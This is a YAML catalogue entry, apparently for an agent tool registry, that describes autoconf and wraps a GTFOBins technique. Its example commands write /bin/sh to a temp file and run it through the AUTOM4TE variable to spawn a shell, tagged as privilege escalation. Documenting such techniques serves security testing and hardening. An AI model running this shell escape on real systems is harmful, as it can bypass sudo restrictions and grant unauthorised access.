---
id: build-autotools-autoconf
namespace: build:autotools:autoconf
name: autoconf
description: Generate configuration scripts, can be used to spawn a shell via the AUTOM4TE environment variable.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - autoheader
  - autoreconf
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs:
    - type: security.execution.context
      description: Sudo or unprivileged execution context
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 8
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: none
  disk_io: low
allowed-tools:
  - autoconf
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "autoconf"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via autoconf using AUTOM4TE
    command: |
      echo /bin/sh >/path/to/temp-file
      chmod +x /path/to/temp-file
      touch configure.ac
      AUTOM4TE=/path/to/temp-file autoconf
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/autoconf/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "autoconf"
    commands:
      - "apt-get install -y autoconf"
---
